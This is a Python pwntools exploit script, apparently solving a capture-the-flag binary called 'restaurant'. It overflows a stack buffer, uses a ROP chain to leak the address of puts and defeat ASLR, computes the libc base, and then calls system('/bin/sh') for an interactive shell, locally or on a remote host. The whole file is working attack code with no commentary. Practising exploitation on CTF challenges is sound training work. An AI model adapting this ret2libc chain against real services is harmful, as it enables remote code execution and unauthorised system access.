from pwn import *
import os

os.system('clear')

def start(argv=[], *a, **kw):
    if args.REMOTE: 
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else: 
        return process([exe] + argv, *a, **kw)

exe = './restaurant'
libc_library = './libc.so.6'
elf = context.binary = ELF(exe, checksec=False)
libc = context.binary = ELF(libc_library, checksec=False)
context.log_level = 'debug'

sh = start()

offsetRsp = b'A' * 40
rop = ROP(elf) 

rop.call(elf.plt['puts'], [next(elf.search(b''))]) 
rop.call(elf.plt['puts'], [elf.got['puts']])
rop.call((rop.find_gadget(['ret']))[0]) 
rop.call(elf.sym['fill']) 
ropGetlibcaslr_addr = offsetRsp + rop.chain()
log.info(rop.dump()) 

sh.sendlineafter(b'>', b'1')

sh.sendlineafter(b'>', ropGetlibcaslr_addr) 
sh.recvuntil(b'\n')
sh.recvuntil(b'\n')
leakedputsLibc = u64(sh.recvuntil(b'\n').strip().ljust(8, b'\x00'))
info('leaked puts() address: %#x', leakedputsLibc)

libcBase = leakedputsLibc - libc.sym['puts']
info('libcBase: %#x', libcBase)

libc.address = libcBase

libcRop = ROP(libc)
libcRop.call((rop.find_gadget(['ret']))[0])
libcRop.call(libc.sym['system'], [next(libc.search(b'/bin/sh\x00'))])

getShell = offsetRsp + libcRop.chain()
log.info(libcRop.dump())

sh.sendlineafter(b'>', getShell)
sh.interactive()
